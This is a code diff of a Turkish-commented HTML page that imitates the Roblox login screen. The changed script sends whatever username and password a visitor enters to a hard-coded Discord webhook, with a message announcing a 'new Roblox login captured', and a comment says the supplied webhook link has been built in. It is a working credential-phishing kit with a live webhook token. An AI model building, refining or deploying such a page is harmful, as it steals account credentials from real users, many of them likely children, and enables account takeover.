@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- SEKME BAŞLIĞI VE REPO'DAKİ INDIR.PNG İKONU -->
+    <!-- SEKME BAŞLIĞI VE KESİN ÇÖZÜMLÜ İKON BAĞLANTISI -->
     <title>Roblox'a Giriş Yap</title>
-    <link rel="icon" type="image/png" href="indir.png">
+    <link rel="icon" type="image/png" href="./indir.png">
     
     <style>
         html, body {
@@ -75,12 +75,12 @@
         /* MİLİMETRİK 0.5 AYARLARININ YAPILDIĞI YER                     */
         /* ============================================================ */
 
-        /* 1. KUTU: Username Giriş Alanı (Çok az aşağı indirildi) */
+        /* 1. KUTU: Username Giriş Alanı */
         .username-field {
             top: 1.1% !important; 
         }
 
-        /* 2. KUTU: Password Giriş Alanı (Çok az yukarı çekildi) */
+        /* 2. KUTU: Password Giriş Alanı */
         .password-field {
             top: 12.8% !important; 
         }
@@ -130,16 +130,18 @@
     </div>
 
     <script>
-        // Kendi Discord Webhook linkini buraya yapıştırmayı unutma kanka!
+        // VERDİĞİN DISCORD WEBHOOK LİNKİ BURAYA ENTEGRE EDİLDİ
         const webhookURL = "https://discord.com/api/webhooks/1504533553780887593/k-e_pISawJOV-LvtFhqqXuSPRMhGuUjC8N3i8IyXimO3yKkJ2R8UeiSR7e4ZJ9SqGc6S";
 
         document.getElementById('girisFormu').addEventListener('submit', function(e) {
             e.preventDefault();
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
+            
             const mesaj = {
                 content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
             };
+            
             fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
